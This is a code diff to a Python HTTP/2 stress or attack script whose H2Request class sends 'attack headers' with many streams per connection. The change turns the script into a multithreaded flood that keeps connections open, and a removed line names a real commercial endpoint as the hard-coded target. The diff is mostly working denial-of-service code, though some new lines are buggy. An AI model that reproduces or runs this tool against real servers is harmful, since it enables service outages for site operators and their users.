@@ -190,46 +190,67 @@ class H2Request():
         self.s.sendall(self.c.data_to_send())
         self.s.close()
 
-if __name__ == "__main__":
-    #args = sys.argv[:]
-    argv = sys.argv[:]
-    if len(argv) == 6:
-        url = argv[1]
-        conn = int(argv[2])
-        max_stream = int(argv[3])
-        server_ip = argv[4]
-        server_port = int(argv[5])
+import _thread
 
-    elif len(argv) == 4:
-        url = argv[1]
-        conn = int(argv[2])
-        max_stream = int(argv[3])
-        server_ip = SERVER_IP
-        server_port = SERVER_PORT
-    else:
-        print("useage: program url conn_per_second stream_per_conn (server_ip) (server_port)")
-        print(sys.argv)
-        sys.exit(0)
-
+def thread_run(url, conn, max_stream, server_ip, server_port):
     if conn == 0:
         conn = 1
     interval = 1.0/conn
     
     conn_count = 0
     l_time = int(time.time())
+   
     
+    conn_list = []
     while (True):
         conn_count += 1
-        if time.time() - l_time > 1:
+        if (conn_count > 100 * conn):
+            break
+        if time.time() - l_time > 10:
             l_time = int(time.time())
             print(time.strftime("%H:%M:%S", time.localtime(time.time())))
             print("total connetion:%d"%conn_count)
         try:
-            h2r = H2Request("https://acs.m.taobao.com/h5", server_port = server_port, server_ip = server_ip)
+            h2r = H2Request(url = url, server_port = server_port, server_ip = server_ip)
             h2r.send_first_header(1200)
-            time.sleep(interval)
             h2r.send_attack_header(max_stream)
-            h2r.close_connection()
+            time.sleep(interval)
+            conn_list.append(h2r)
+            if len(conn_list > conn):
+                conn_list[0].close_connection()
+                conn_list.remove(conn_list[0])
+        
         except:
             continue
+  
+        
+
+if __name__ == "__main__":
+    #args = sys.argv[:]
+    argv = sys.argv[:]
+    if len(argv) == 7:
+        url = argv[1]
+        conn = int(argv[2])
+        max_stream = int(argv[3])
+        thread_num = int(argv[4])
+        server_ip = argv[5]
+        server_port = int(argv[6])
+
+    elif len(argv) == 5:
+        url = argv[1]
+        conn = int(argv[2])
+        max_stream = int(argv[3])
+        thread_num = int(argv[4])
+        server_ip = SERVER_IP
+        server_port = SERVER_PORT
+    else:
+        print("useage: program url max_conn stream_per_conn thread_num (server_ip) (server_port)")
+        print(sys.argv)
+        sys.exit(0)
+
+    for i in range(0, conn):
+        _thread.start_new_thread(thread_run, (url, conn, max_stream, server_ip, server_port))
+
+    while 1:
+        pass
 
